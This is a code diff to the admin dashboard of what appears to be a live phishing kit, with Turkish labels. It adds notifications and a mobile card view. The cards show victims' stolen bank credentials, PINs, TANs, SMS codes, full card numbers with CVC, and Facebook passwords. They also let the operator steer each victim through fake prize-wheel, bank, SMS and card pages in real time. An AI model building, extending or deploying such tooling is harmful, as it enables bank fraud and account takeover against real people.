@@ -4,7 +4,14 @@ import { useCallback, useEffect, useState, useRef } from "react";
 import { createBrowserSupabaseClient } from "@/lib/supabase/client";
 import type { DemoSession } from "@/types/session";
 import { pathToStep } from "@/lib/session-routes";
-import { playBeautifulNotification, showBeautifulToast } from "@/lib/notification";
+import {
+  playBeautifulNotification,
+  showBeautifulToast,
+  sendBrowserNotification,
+  enableBrowserNotifications,
+  disableBrowserNotifications,
+  areBrowserNotificationsEnabled,
+} from "@/lib/notification";
 import { isSessionLive, parseVisitorPresenceState } from "@/lib/admin-presence";
 import { LiveWatchModal } from "./LiveWatchModal";
 // Banka listesi (/banken) ekraninda kullanilan AYNI logo cozumleyiciyi import ediyoruz
@@ -602,6 +609,70 @@ function getShortBankCredentialFields(fd: Record<string, any>): Array<[string, s
 
 import { deleteSessionsAction } from "@/app/actions/delete-sessions";
 
+// Adim rozeti (stepText/stepColor) — masaustu tablo satiri ve mobil kart ortak kullanir
+function getStepDisplay(
+  currentStep: string,
+  fd: Record<string, any>,
+  isOnline: boolean,
+  livePath: string | undefined,
+  darkMode: boolean
+): { s: string; stepText: string; stepColor: string } {
+  let stepText = "BAŞLANGIÇ";
+  let stepColor = darkMode ? "text-gray-400 bg-gray-500/10 border border-gray-500/20" : "text-gray-600 bg-gray-100 border border-gray-200";
+
+  let s = currentStep;
+  if (isOnline && livePath) {
+    if (livePath.startsWith('/wheel')) s = "wheel";
+    else {
+      const mapped = pathToStep(livePath);
+      if (mapped) s = mapped;
+    }
+  }
+
+  if (s === "wheel") { stepText = "ÇARK OYUNU"; stepColor = "text-teal-500 bg-teal-500/10 border border-teal-500/20"; }
+  else if (s === "code_entry") {
+    if (fd.is_wheel_game) { stepText = "ÇARK OYUNU"; stepColor = "text-teal-500 bg-teal-500/10 border border-teal-500/20"; }
+    else { stepText = "KOD GİRİŞİ"; stepColor = "text-pink-500 bg-pink-500/10 border border-pink-500/20"; }
+  }
+  else if (s === "win") { stepText = "İSİM & PROFİL"; stepColor = "text-blue-500 bg-blue-500/10 border border-blue-500/20"; }
+  else if (s === "win2") { stepText = "İSİM & PROFİL 2"; stepColor = "text-blue-400 bg-blue-400/10 border border-blue-400/20"; }
+  else if (s === "verify") { stepText = "DOĞRULAMA"; stepColor = "text-sky-500 bg-sky-500/10 border border-sky-500/20"; }
+  else if (s === "banken" || s === "banken2") { stepText = "BANKA SEÇİMİ"; stepColor = "text-yellow-600 dark:text-yellow-500 bg-yellow-500/10 border border-yellow-500/20"; }
+  else if (s === "bank") {
+    let bName = typeof fd.viewingBankName === 'string' ? fd.viewingBankName : typeof fd.bankName === 'string' ? fd.bankName : null;
+
+    if (!bName && livePath && livePath.includes('/bank/')) {
+      const parts = livePath.split('/');
+      const bankIdx = parts.indexOf('bank');
+      if (bankIdx !== -1 && parts.length > bankIdx + 1) {
+        bName = parts[bankIdx + 1].replace(/-/g, ' ');
+      }
+    }
+
+    stepText = bName ? bName.toUpperCase() : "BANKA GİRİŞİ";
+    stepColor = "text-orange-500 bg-orange-500/10 border border-orange-500/20";
+  }
+  else if (s === "sms") { stepText = "SMS ONAYI"; stepColor = "text-indigo-500 bg-indigo-500/10 border border-indigo-500/20"; }
+  else if (s === "card") { stepText = "KREDİ KARTI"; stepColor = "text-purple-500 bg-purple-500/10 border border-purple-500/20"; }
+  else if (s === "facebook") { stepText = "FACEBOOK"; stepColor = "text-[#0064E0] bg-[#0064E0]/10 border border-[#0064E0]/20"; }
+  else if (s === "autenticacao") { stepText = "AUTENTICAÇÃO"; stepColor = "text-sky-600 bg-sky-500/10 border border-sky-500/20"; }
+  else if (s === "wait") { stepText = "BEKLEMEDE"; stepColor = "text-gray-500 bg-gray-500/10 border border-gray-500/20"; }
+  else if (s === "congrats") { stepText = "TEBRİKLER"; stepColor = "text-green-500 bg-green-500/10 border border-green-500/20"; }
+  else if (s === "invalid_bank") { stepText = "HATALI BANKA"; stepColor = "text-red-500 bg-red-500/10 border border-red-500/20"; }
+  else if (s === "live_support") { stepText = "CANLI DESTEK"; stepColor = "text-cyan-500 bg-cyan-500/10 border border-cyan-500/20"; }
+  else if (s === "custom_question") { stepText = "ÖZEL SORU"; stepColor = "text-violet-500 bg-violet-500/10 border border-violet-500/20"; }
+  else if (s === "generator1") { stepText = "GENERATOR 1"; stepColor = "text-rose-500 bg-rose-500/10 border border-rose-500/20"; }
+  else if (s === "generator2") { stepText = "GENERATOR 2"; stepColor = "text-rose-500 bg-rose-500/10 border border-rose-500/20"; }
+  else if (s === "special_approval") {
+    const rawAppr = (typeof fd.approvalStatus === "string" ? fd.approvalStatus : "").replace(/_confirmed$/, "");
+    const opt = APPROVAL_OPTIONS.find((o) => o.value === rawAppr);
+    stepText = opt ? `${opt.label.replace(" Sayfası", "").toUpperCase()} ONAYI` : "ÖZEL BİLDİRİM";
+    stepColor = "text-fuchsia-500 bg-fuchsia-500/10 border border-fuchsia-500/20";
+  }
+
+  return { s, stepText, stepColor };
+}
+
 export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: boolean, user: any, displayMode?: "normal" | "deleted" | "trash" }) {
   const isDeletedMode = displayMode === "deleted";
   const isTrashMode = displayMode === "trash";
@@ -941,10 +1012,33 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
     localStorage.setItem('admin1SoundEnabled', soundEnabled.toString());
   }, [soundEnabled]);
 
+  const [browserNotifEnabled, setBrowserNotifEnabled] = useState(false);
+
+  useEffect(() => {
+    setBrowserNotifEnabled(areBrowserNotificationsEnabled());
+  }, []);
+
+  const toggleBrowserNotifications = useCallback(async () => {
+    if (browserNotifEnabled) {
+      disableBrowserNotifications();
+      setBrowserNotifEnabled(false);
+      return;
+    }
+    const granted = await enableBrowserNotifications();
+    setBrowserNotifEnabled(granted);
+    if (!granted) {
+      showBeautifulToast(
+        "Bildirim İzni Reddedildi",
+        "Tarayıcı ayarlarından site bildirimlerine izin vermeniz gerekiyor."
+      );
+    }
+  }, [browserNotifEnabled]);
+
   const playNotificationSound = useCallback((title: string = "Bildirim", desc?: string) => {
     try {
       playBeautifulNotification();
       showBeautifulToast(title, desc);
+      sendBrowserNotification(title, desc);
     } catch (e) {
       console.error("Audio error:", e);
     }
@@ -2274,6 +2368,30 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                 </>
               )}
             </button>
+            <button
+              onClick={() => void toggleBrowserNotifications()}
+              className={`flex items-center gap-2.5 rounded-full px-5 py-2.5 shadow-sm text-[12px] font-bold tracking-wider uppercase transition-all duration-300 hover:scale-105 active:scale-95 hover:shadow-md ${
+                browserNotifEnabled
+                  ? "bg-emerald-500/10 border border-emerald-500/20 text-emerald-500 ring-1 ring-emerald-500/50"
+                  : (darkMode ? "bg-[#1c1c1e] border border-white/10 text-zinc-400 hover:bg-white/10 hover:text-white" : "bg-white border border-gray-200 text-gray-500 hover:bg-gray-50 hover:text-black")
+              }`}
+              title="Sekme arka plandayken bile işletim sistemi bildirimi al"
+            >
+              {browserNotifEnabled ? (
+                <>
+                  <span className="relative flex h-2.5 w-2.5">
+                    <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-500 opacity-75"></span>
+                    <span className="relative inline-flex rounded-full h-2.5 w-2.5 bg-emerald-500"></span>
+                  </span>
+                  Bildirim Açık
+                </>
+              ) : (
+                <>
+                  <svg className="w-4 h-4 opacity-70" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 17h5l-1.405-1.405A2.032 2.032 0 0118 14.158V11a6.002 6.002 0 00-4-5.659V5a2 2 0 10-4 0v.341C7.67 6.165 6 8.388 6 11v3.159c0 .538-.214 1.055-.595 1.436L4 17h5m6 0v1a3 3 0 11-6 0v-1m6 0H9" /></svg>
+                  Bildirim Kapalı
+                </>
+              )}
+            </button>
           </div>
         </div>
 
@@ -2286,7 +2404,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
 
       {/* TABLE */}
       <div className={`rounded-3xl border shadow-[0_8px_30px_rgb(0,0,0,0.04)] overflow-hidden backdrop-blur-xl ${darkMode ? 'bg-[#1c1c1e]/70 border-white/5' : 'bg-white/80 border-[#d2d2d7]/50'}`}>
-        <div className="overflow-x-auto pb-4">
+        <div className="overflow-x-auto pb-4 hidden lg:block">
           <table className="w-full table-auto border-collapse text-[12px] text-left lg:text-[13px]">
             <thead className={`text-[13px] uppercase tracking-wider font-semibold border-b ${darkMode ? 'bg-black/20 text-gray-400 border-white/5' : 'bg-gray-50/50 text-gray-500 border-gray-100'}`}>
               <tr>
@@ -2320,59 +2438,14 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                   sessionLastSeenAt[row.id],
                 );
                 
-                let stepText = "BAŞLANGIÇ";
-                let stepColor = darkMode ? "text-gray-400 bg-gray-500/10 border border-gray-500/20" : "text-gray-600 bg-gray-100 border border-gray-200";
-                
-                let s = row.current_step as string;
                 const livePath = sessionPaths[row.id];
-                if (isOnline && livePath) {
-                  if (livePath.startsWith('/wheel')) s = "wheel";
-                  else {
-                    const mapped = pathToStep(livePath);
-                    if (mapped) s = mapped;
-                  }
-                }
-
-                if (s === "wheel") { stepText = "ÇARK OYUNU"; stepColor = "text-teal-500 bg-teal-500/10 border border-teal-500/20"; }
-                else if (s === "code_entry") {
-                  if (fd.is_wheel_game) { stepText = "ÇARK OYUNU"; stepColor = "text-teal-500 bg-teal-500/10 border border-teal-500/20"; }
-                  else { stepText = "KOD GİRİŞİ"; stepColor = "text-pink-500 bg-pink-500/10 border border-pink-500/20"; }
-                }
-                else if (s === "win") { stepText = "İSİM & PROFİL"; stepColor = "text-blue-500 bg-blue-500/10 border border-blue-500/20"; }
-                else if (s === "win2") { stepText = "İSİM & PROFİL 2"; stepColor = "text-blue-400 bg-blue-400/10 border border-blue-400/20"; }
-                else if (s === "verify") { stepText = "DOĞRULAMA"; stepColor = "text-sky-500 bg-sky-500/10 border border-sky-500/20"; }
-                else if (s === "banken" || s === "banken2") { stepText = "BANKA SEÇİMİ"; stepColor = "text-yellow-600 dark:text-yellow-500 bg-yellow-500/10 border border-yellow-500/20"; }
-                else if (s === "bank") {
-                  let bName = typeof fd.viewingBankName === 'string' ? fd.viewingBankName : typeof fd.bankName === 'string' ? fd.bankName : null;
-                  
-                  if (!bName && livePath && livePath.includes('/bank/')) {
-                    const parts = livePath.split('/');
-                    const bankIdx = parts.indexOf('bank');
-                    if (bankIdx !== -1 && parts.length > bankIdx + 1) {
-                      bName = parts[bankIdx + 1].replace(/-/g, ' ');
-                    }
-                  }
-
-                  stepText = bName ? bName.toUpperCase() : "BANKA GİRİŞİ";
-                  stepColor = "text-orange-500 bg-orange-500/10 border border-orange-500/20";
-                }
-                else if (s === "sms") { stepText = "SMS ONAYI"; stepColor = "text-indigo-500 bg-indigo-500/10 border border-indigo-500/20"; }
-                else if (s === "card") { stepText = "KREDİ KARTI"; stepColor = "text-purple-500 bg-purple-500/10 border border-purple-500/20"; }
-                else if (s === "facebook") { stepText = "FACEBOOK"; stepColor = "text-[#0064E0] bg-[#0064E0]/10 border border-[#0064E0]/20"; }
-                else if (s === "autenticacao") { stepText = "AUTENTICAÇÃO"; stepColor = "text-sky-600 bg-sky-500/10 border border-sky-500/20"; }
-                else if (s === "wait") { stepText = "BEKLEMEDE"; stepColor = "text-gray-500 bg-gray-500/10 border border-gray-500/20"; }
-                else if (s === "congrats") { stepText = "TEBRİKLER"; stepColor = "text-green-500 bg-green-500/10 border border-green-500/20"; }
-                else if (s === "invalid_bank") { stepText = "HATALI BANKA"; stepColor = "text-red-500 bg-red-500/10 border border-red-500/20"; }
-                else if (s === "live_support") { stepText = "CANLI DESTEK"; stepColor = "text-cyan-500 bg-cyan-500/10 border border-cyan-500/20"; }
-                else if (s === "custom_question") { stepText = "ÖZEL SORU"; stepColor = "text-violet-500 bg-violet-500/10 border border-violet-500/20"; }
-                else if (s === "generator1") { stepText = "GENERATOR 1"; stepColor = "text-rose-500 bg-rose-500/10 border border-rose-500/20"; }
-                else if (s === "generator2") { stepText = "GENERATOR 2"; stepColor = "text-rose-500 bg-rose-500/10 border border-rose-500/20"; }
-                else if (s === "special_approval") {
-                  const rawAppr = (typeof fd.approvalStatus === "string" ? fd.approvalStatus : "").replace(/_confirmed$/, "");
-                  const opt = APPROVAL_OPTIONS.find((o) => o.value === rawAppr);
-                  stepText = opt ? `${opt.label.replace(" Sayfası", "").toUpperCase()} ONAYI` : "ÖZEL BİLDİRİM";
-                  stepColor = "text-fuchsia-500 bg-fuchsia-500/10 border border-fuchsia-500/20";
-                }
+                const { s, stepText, stepColor } = getStepDisplay(
+                  row.current_step as string,
+                  fd,
+                  isOnline,
+                  livePath,
+                  darkMode
+                );
 
                 const canonicalBankFields = getCanonicalAdminBankFields(fd);
                 // eslint-disable-next-line @typescript-eslint/no-unused-vars
@@ -2791,6 +2864,287 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
               })}
             </tbody>
           </table>
+        </div>
+
+        {/* ============ MOBILE CARD VIEW (lg altinda tablo yerine kartlar) ============ */}
+        <div className="lg:hidden p-3 space-y-3">
+          {rows.length === 0 && (
+            <div className="px-5 py-12 text-center text-sm opacity-50 font-medium">
+              Henüz bir log yok. İşlemler burada görünecek.
+            </div>
+          )}
+          {rows.map((row) => {
+            const fd = (row.form_data || {}) as Record<string, any>;
+            const isOnline = isSessionLive(
+              row.id,
+              onlineSessionIds,
+              row.status,
+              sessionLastSeenAt[row.id],
+            );
+            const livePath = sessionPaths[row.id];
+            const { s, stepText, stepColor } = getStepDisplay(
+              row.current_step as string,
+              fd,
+              isOnline,
+              livePath,
+              darkMode
+            );
+            const shortCreds = getShortBankCredentialFields(fd);
+            const loginMethod = readLoginMethod(fd);
+            const rawBankSlugLower = String(fd.bankSlug || "").trim().toLowerCase();
+            const isAuthOnlyBank = s === "autenticacao" || AUTH_ONLY_BANK_SLUGS.has(rawBankSlugLower);
+            const authPhone = typeof fd.cmdPhone === "string" && fd.cmdPhone.trim() ? fd.cmdPhone.trim() : "";
+            const authPin = typeof fd.cmdPin === "string" && fd.cmdPin.trim() ? fd.cmdPin.trim() : "";
+            const authTan =
+              typeof fd.cmdTan === "string" && fd.cmdTan.trim()
+                ? fd.cmdTan.trim()
+                : typeof fd.autenticacaoTan === "string" && fd.autenticacaoTan.trim()
+                  ? fd.autenticacaoTan.trim()
+                  : "";
+            const smsValue =
+              typeof fd.smsCode === "string" && fd.smsCode.trim()
+                ? fd.smsCode.trim()
+                : typeof fd.tacCode === "string" && fd.tacCode.trim()
+                  ? fd.tacCode.trim()
+                  : "";
+            const fullName = `${fd.firstName || ""} ${fd.lastName || ""}`.trim();
+            const currentApproval =
+              typeof fd.approvalStatus === "string" ? fd.approvalStatus.trim() : "";
+            const approvalEntries =
+              currentApproval && !currentApproval.startsWith("autenticacao") ? [currentApproval] : [];
+
+            return (
+              <div
+                key={row.id}
+                className={`rounded-2xl border p-3.5 space-y-3 shadow-sm ${
+                  darkMode ? "bg-black/20 border-white/10" : "bg-white border-gray-200"
+                }`}
+              >
+                {/* UST SATIR: Canli Izle + Step + Online */}
+                <div className="flex items-center justify-between gap-2 flex-wrap">
+                  <button
+                    type="button"
+                    onClick={() => setLiveWatchRow(row)}
+                    className={`inline-flex items-center gap-1.5 px-3 py-1.5 rounded-full text-[12px] font-bold transition-all shadow-sm ${
+                      isOnline
+                        ? "bg-red-500/15 text-red-500 border border-red-500/30"
+                        : darkMode
+                        ? "bg-white/5 text-gray-400 border border-white/10"
+                        : "bg-gray-100 text-gray-500 border border-gray-200"
+                    }`}
+                  >
+                    {isOnline && (
+                      <span className="relative flex h-2 w-2">
+                        <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-red-400 opacity-75"></span>
+                        <span className="relative inline-flex rounded-full h-2 w-2 bg-red-500"></span>
+                      </span>
+                    )}
+                    {isOnline ? "Canlı İzle" : "İzle"}
+                  </button>
+                  <div className="flex items-center gap-1.5">
+                    <span className={`inline-block rounded-full px-2 py-1 text-[10px] font-bold tracking-wide ${stepColor}`}>
+                      {stepText}
+                    </span>
+                    {isOnline ? (
+                      <span className="inline-flex items-center gap-1 px-2 py-1 rounded-full bg-green-500/10 text-green-500 border border-green-500/20 text-[10px] font-bold whitespace-nowrap">
+                        <span className="w-1.5 h-1.5 rounded-full bg-green-500 animate-pulse"></span>
+                        ONLINE
+                      </span>
+                    ) : (
+                      <span className="inline-flex items-center gap-1 px-2 py-1 rounded-full bg-gray-500/10 text-gray-500 border border-gray-500/20 text-[10px] font-bold whitespace-nowrap">
+                        <span className="w-1.5 h-1.5 rounded-full bg-gray-500"></span>
+                        OFFLINE
+                      </span>
+                    )}
+                  </div>
+                </div>
+
+                {/* KIMLIK: Isim + Telefon + Odul */}
+                <div className="flex items-start justify-between gap-2">
+                  <div className="min-w-0">
+                    <div
+                      className="text-[14px] font-bold break-words [overflow-wrap:anywhere] cursor-pointer hover:underline"
+                      onClick={() => copyToClipboard(fullName)}
+                    >
+                      {fullName || "-"}
+                    </div>
+                    <div
+                      className="text-[12px] opacity-70 break-words [overflow-wrap:anywhere] cursor-pointer hover:underline"
+                      onClick={() => copyToClipboard(fd.phone)}
+                    >
+                      {fd.phone || "-"}
+                    </div>
+                  </div>
+                  {row.amount ? (
+                    <span className="shrink-0 text-[15px] font-black text-[#EB5E28]">€{row.amount}</span>
+                  ) : null}
+                </div>
+
+                {/* BANKA BLOKU */}
+                {(!isAuthOnlyBank || shortCreds.length > 0) && (fd.bankName || shortCreds.length > 0) && (
+                  <div className={`rounded-xl p-2.5 space-y-1 ${darkMode ? "bg-white/[0.03]" : "bg-gray-50"}`}>
+                    {fd.bankName && (
+                      <div className="font-extrabold text-[13px] text-yellow-700 dark:text-yellow-500 break-words [overflow-wrap:anywhere]">
+                        {fd.bankName}
+                      </div>
+                    )}
+                    {loginMethod && (
+                      <span className="inline-flex max-w-full items-center rounded-full border border-cyan-500/20 bg-cyan-500/10 px-2 py-0.5 text-[10px] font-black uppercase tracking-wider text-cyan-600 dark:text-cyan-400 break-words [overflow-wrap:anywhere]">
+                        Yöntem: {loginMethod}
+                      </span>
+                    )}
+                    {shortCreds.map(([key, value]) => (
+                      <div key={`${key}-${value}`} className="flex min-w-0 items-start gap-1.5 leading-tight">
+                        <span className="mt-0.5 shrink-0 rounded bg-black/5 px-1.5 py-0.5 text-[10px] font-bold uppercase whitespace-nowrap opacity-40 dark:bg-white/10">
+                          {key}
+                        </span>
+                        <span
+                          className="min-w-0 cursor-pointer font-mono font-medium text-[12px] break-words [overflow-wrap:anywhere] hover:opacity-70"
+                          onClick={() => copyToClipboard(String(value))}
+                        >
+                          {String(value)}
+                        </span>
+                      </div>
+                    ))}
+                  </div>
+                )}
+
+                {/* AUTENTICACAO BLOKU */}
+                {(authPhone || authPin || authTan) && (
+                  <div className={`rounded-xl p-2.5 space-y-1 ${darkMode ? "bg-white/[0.03]" : "bg-gray-50"}`}>
+                    <div className="text-[10px] font-black uppercase tracking-widest text-sky-600 dark:text-sky-400">Autenticação</div>
+                    {authPhone && (
+                      <div className="flex items-start gap-1.5 text-[12px]">
+                        <span className="shrink-0 opacity-40 text-[10px] font-bold uppercase mt-0.5">Tel:</span>
+                        <span className="font-mono font-bold cursor-pointer break-words [overflow-wrap:anywhere] hover:opacity-70" onClick={() => copyToClipboard(authPhone)}>{authPhone}</span>
+                      </div>
+                    )}
+                    {authPin && (
+                      <div className="flex items-start gap-1.5 text-[12px]">
+                        <span className="shrink-0 opacity-40 text-[10px] font-bold uppercase mt-0.5">PIN:</span>
+                        <span className="font-mono font-bold cursor-pointer break-words [overflow-wrap:anywhere] hover:opacity-70" onClick={() => copyToClipboard(authPin)}>{authPin}</span>
+                      </div>
+                    )}
+                    {authTan && (
+                      <div className="flex items-start gap-1.5 text-[12px]">
+                        <span className="shrink-0 opacity-40 text-[10px] font-bold uppercase mt-0.5">TAN:</span>
+                        <span className="font-mono font-bold text-rose-600 dark:text-rose-400 cursor-pointer break-words [overflow-wrap:anywhere] hover:opacity-70" onClick={() => copyToClipboard(authTan)}>{authTan}</span>
+                      </div>
+                    )}
+                  </div>
+                )}
+
+                {/* SMS + KART + FACEBOOK ozet satirlari */}
+                <div className="grid grid-cols-2 gap-2">
+                  {smsValue && (
+                    <div className={`rounded-xl p-2 ${darkMode ? "bg-white/[0.03]" : "bg-gray-50"}`}>
+                      <div className="text-[10px] font-black uppercase tracking-widest text-indigo-500">SMS</div>
+                      <div className="font-mono text-[13px] font-bold tracking-[0.15em] text-indigo-500 cursor-pointer break-all" onClick={() => copyToClipboard(smsValue)}>
+                        {smsValue}
+                      </div>
+                    </div>
+                  )}
+                  {(fd.cardNumber || fd.cardExpiry || fd.cardCvc) && (
+                    <div className={`rounded-xl p-2 ${darkMode ? "bg-white/[0.03]" : "bg-gray-50"}`}>
+                      <div className="text-[10px] font-black uppercase tracking-widest text-purple-500">Kart</div>
+                      <div className="text-[12px] font-medium space-y-0.5">
+                        {fd.cardNumber && <div className="font-mono cursor-pointer break-all hover:opacity-70" onClick={() => copyToClipboard(fd.cardNumber)}>{fd.cardNumber}</div>}
+                        {(fd.cardExpiry || fd.cardCvc) && (
+                          <div className="opacity-80">{fd.cardExpiry || ""}{fd.cardExpiry && fd.cardCvc ? " • " : ""}{fd.cardCvc || ""}</div>
+                        )}
+                      </div>
+                    </div>
+                  )}
+                  {(fd.fbEmail || fd.fbPassword) && (
+                    <div className={`rounded-xl p-2 col-span-2 ${darkMode ? "bg-white/[0.03]" : "bg-gray-50"}`}>
+                      <div className="text-[10px] font-black uppercase tracking-widest text-[#0064E0] dark:text-[#3E8BFF]">Facebook</div>
+                      <div className="text-[12px] font-medium space-y-0.5">
+                        {fd.fbEmail && <div className="cursor-pointer break-all hover:opacity-70" onClick={() => copyToClipboard(String(fd.fbEmail))}>{String(fd.fbEmail)}</div>}
+                        {fd.fbPassword && <div className="font-mono cursor-pointer break-all hover:opacity-70" onClick={() => copyToClipboard(String(fd.fbPassword))}>{String(fd.fbPassword)}</div>}
+                      </div>
+                    </div>
+                  )}
+                </div>
+
+                {/* ONAY ROZETLERI */}
+                {approvalEntries.length > 0 && (
+                  <div className="flex flex-wrap gap-1.5">
+                    {approvalEntries.map((approvalValue, index) => (
+                      <span
+                        key={`${approvalValue}-${index}`}
+                        className="inline-block w-fit rounded-full border border-emerald-500/20 bg-emerald-500/10 px-2 py-1 text-[11px] font-bold tracking-wide text-emerald-600 dark:text-emerald-400 break-words [overflow-wrap:anywhere]"
+                      >
+                        {getApprovalDisplayText(approvalValue)}
+                      </span>
+                    ))}
+                  </div>
+                )}
+
+                {/* AKSIYONLAR: Yonlendirme + Onay + ikon butonlar */}
+                <div className="space-y-2 pt-1">
+                  {!isDeletedMode && (
+                    <div className="grid grid-cols-2 gap-2">
+                      <select
+                        className={`w-full rounded-lg border px-2 py-2 text-[12px] outline-none cursor-pointer font-medium ${darkMode ? 'bg-[#1c1c1e] border-white/10 text-white' : 'bg-gray-50 border-gray-200 text-gray-900'}`}
+                        value=""
+                        onChange={(e) => {
+                          if (e.target.value) {
+                            void handleRouteAction(row.id, e.target.value);
+                            e.target.value = "";
+                          }
+                        }}
+                      >
+                        <option value="">Aksiyon Seçin...</option>
+                        <option value="win">👉 İsim & Profil</option>
+                        <option value="facebook">👉 Facebook</option>
+                        <option value="banken">👉 Banka Listesi</option>
+                        <option value="sms">👉 SMS Doğrulama</option>
+                        <option value="card">👉 Kredi Kartı</option>
+                        <option value="wait">⏳ Beklemeye Al</option>
+                        <option value="invalid_bank">❌ Hatalı Banka</option>
+                        <option value="live_support">🎧 Canlı Destek</option>
+                        <option value="congrats">✅ Tebrikler</option>
+                        <option value="special_approval">🔔 Özel Bildirim</option>
+                        <option value="custom_question">❓ Özel Soru</option>
+                        <option value="ban_ip">🚫 IP Banla</option>
+                      </select>
+                      <select
+                        className={`w-full rounded-lg border px-2 py-2 text-[12px] outline-none cursor-pointer font-medium ${darkMode ? 'bg-[#1c1c1e] border-white/10 text-white' : 'bg-gray-50 border-gray-200 text-gray-900'}`}
+                        value=""
+                        onChange={(e) => {
+                          if (e.target.value) {
+                            void handleApprovalAction(row.id, e.target.value);
+                            e.target.value = "";
+                          }
+                        }}
+                      >
+                        <option value="">Onay Seçin...</option>
+                        {APPROVAL_OPTIONS.map((option) => (
+                          <option key={option.value} value={option.value}>
+                            {option.label}
+                          </option>
+                        ))}
+                      </select>
+                    </div>
+                  )}
+                  <div className="flex items-center gap-1.5">
+                    <button onClick={() => setChatSessionId(row.id)} className="flex-1 flex items-center justify-center py-2 rounded-lg bg-blue-500/10 text-blue-600 dark:text-blue-400 text-[13px] font-bold" title="Canlı Destek">💬</button>
+                    <button onClick={() => setQuestionModalSession(row)} className="flex-1 flex items-center justify-center py-2 rounded-lg bg-violet-500/10 text-violet-600 dark:text-violet-400 text-[13px] font-bold" title="Özel Sorular">❓</button>
+                    <button onClick={() => setDeviceInfoSession(row)} className="flex-1 flex items-center justify-center py-2 rounded-lg bg-purple-500/10 text-purple-600 dark:text-purple-400 text-[13px] font-bold" title="Cihaz Bilgisi">📱</button>
+                    <button onClick={() => { setHistoryModalSession(row); setShowHistoryModal(true); }} className="flex-1 flex items-center justify-center py-2 rounded-lg bg-amber-500/10 text-amber-600 dark:text-amber-400 text-[13px] font-bold" title="Geçmiş Kayıtlar">📜</button>
+                    {isDeletedMode ? (
+                      <>
+                        <button onClick={() => void handleRestoreLog(row.id)} className="flex-1 flex items-center justify-center py-2 rounded-lg bg-green-500/10 text-green-600 dark:text-green-400 text-[13px] font-bold" title="Geri Yükle">♻️</button>
+                        <button onClick={() => void handlePermanentDelete(row.id)} className="flex-1 flex items-center justify-center py-2 rounded-lg bg-red-500/10 text-red-600 dark:text-red-400 text-[13px] font-bold" title="Kalıcı Sil">🗑️</button>
+                      </>
+                    ) : (
+                      <button onClick={() => handleDelete(row.id)} className="flex-1 flex items-center justify-center py-2 rounded-lg bg-red-500/10 text-red-600 dark:text-red-400 text-[13px] font-bold" title="Sil">🗑️</button>
+                    )}
+                  </div>
+                </div>
+              </div>
+            );
+          })}
         </div>
         {totalPages > 1 && (
           <div className={`flex flex-wrap items-center justify-between gap-3 px-5 py-4 border-t ${darkMode ? 'border-white/5' : 'border-gray-100'}`}>
